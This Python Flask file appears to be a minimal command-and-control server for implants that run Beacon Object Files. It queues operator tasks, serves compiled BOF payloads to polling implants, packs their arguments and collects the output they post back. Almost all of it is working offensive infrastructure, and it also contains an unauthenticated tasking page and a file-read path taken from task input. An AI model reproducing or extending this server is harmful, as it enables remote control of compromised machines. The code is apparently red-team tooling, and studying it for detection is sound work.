from flask import Flask
from flask import request
from flask import send_from_directory
import base64
import json
import binascii
from struct import pack, calcsize
from collections import deque
import secrets

app = Flask(__name__)

bofsRootDir = "/bofs/"

"""
Structure of tasks:
cmdData0 = {
	"name" : "bof:udpScanner",
	"argv" : "8.8.8.8:53",
	"header" : "thread:zb",
	"buffer" : "file:udpPayloads.txt",
};

cmdData1 = {
	"name" : "bof:uname",
	"argv" : "-r",
	"header" : "inline:z",
};
"""

taskFifo = deque()

inputDict = dict()
outputDict = dict()

# borrowed from https://github.com/trustedsec/COFFLoader/blob/main/beacon_generate.py
class BeaconPack:
    def __init__(self):
        self.buffer = b''
        self.size = 0

    def getbuffer(self):
        return pack("<L", self.size) + self.buffer

    def addshort(self, short):
        self.buffer += pack("<h", short)
        self.size += 2

    def addint(self, dint):
        self.buffer += pack("<i", dint)
        self.size += 4

    def addstr(self, s):
        if isinstance(s, str):
            s = s.encode("utf-8")
        fmt = "<L{}s".format(len(s) + 1)
        self.buffer += pack(fmt, len(s)+1, s)
        self.size += calcsize(fmt)

    def addWstr(self, s):
        if isinstance(s, str):
            s = s.encode("utf-16_le")
        fmt = "<L{}s".format(len(s) + 2)
        self.buffer += pack(fmt, len(s)+2, s)
        self.size += calcsize(fmt)


@app.route("/")
def main_page():
    return "<p>bofs repository</p>"

@app.route("/tasking", methods=['GET', 'POST'])
def addTask():

    if request.method == 'POST' and request.is_json:
        reqData = request.get_json()
        # add unique ID to the task
        reqData['id'] = secrets.token_hex()
        # convert JSON request to string and append it to task FIFO
        data = json.dumps(reqData)
        taskFifo.appendleft(data) 
        return "<p>Consumed</p>"


    # handle GET:
    resp = []
    resp.append("<p>Pending tasks queue:</p>")

    for task in taskFifo:
        resp.append(task + '<br/>')

    resp.append("<p>Tasks history:</p>")

    for key, value in inputDict.items():
        if key in outputDict:
            resp.append(value + '<br/>')
            resp.append(outputDict[key].decode('utf-8') + '<br/><br/>')
    
    str_out = ''.join(resp)
    return str_out

@app.route("/endpoint", methods=['GET', 'POST'])
def heartbeat():

    if request.method == 'POST':
        reqID = request.headers.get('authorization')
        data = base64.b64decode(request.get_data())
        outputDict[reqID] = data
        return ""

    # get arch and os from 'Authorization' header
    authz = base64.b64decode(request.headers.get('authorization')).decode('utf-8')
    if not authz:
        return "go away"

    arch, os = authz.split(':')
    if arch == "x86_64":
        arch = "x64"
    if os == "windows":
        os = "coff"
    else:
        os = "elf"

    if len(taskFifo) == 0:
        return "nothing to do"

    # get tasking data and process it
    data = taskFifo.pop()
    cmdData = json.loads(data)
    reqID = cmdData['id']
    inputDict[reqID] = data

    resp = {
        "id": cmdData['id'],
        "name": cmdData['name'],
        "header": cmdData['header'],
    }

    # prepare 'path' field for bofs
    if 'bof:' in cmdData['name']:
        _, name = cmdData['name'].split(':')
        resp['path'] = bofsRootDir + name + "." + os + "." + arch + ".o"

    header = cmdData['header']
    args_spec = header.split(':')[1]

    # check if 'header' contains buffer:
    for c in args_spec:
        # buffer in 'header'
        if c == 'b':
            if 'file:' in cmdData['buffer']:
                _, path = cmdData['buffer'].split(':')
                with open(path, 'rb') as f:
                     resp['buffer'] = base64.b64encode(f.read()).decode('utf-8')
            else:
                resp['buffer'] = base64.b64encode(cmdData['buffer'])
            # we're done, remove 'b' character
            args_spec = args_spec.replace('b', '')


    if 'argv' in cmdData:
        ArgsPack = BeaconPack()

        # build 'args' by parsing 'argv' and inspecting args_spec:
        # possible values in 'header': iszZ
        arg_list = cmdData['argv'].split(' ')
        i = 0
        while i < len(arg_list):
            if args_spec[i] == 'z':
                ArgsPack.addstr(arg_list[i])
            elif args_spec[i] == 'Z':
                ArgsPack.addWstr(arg_list[i])
            elif args_spec[i] == 's':
                ArgsPack.addshort(arg_list[i])
            elif args_spec[i] == 'i':
                ArgsPack.addint(arg_list[i])
            i += 1
        resp ['args'] = base64.b64encode(ArgsPack.getbuffer()).decode('utf-8')
        #TODO: in implant allocate buffer if present and add to bof_args

    
    return resp

@app.route(bofsRootDir + '<path:path>')
def send_report(path):
    return send_from_directory('bofs', path, mimetype='application/octet-stream')

if __name__ == '__main__':
    app.run(host='127.0.0.1',port=8000,debug=True)
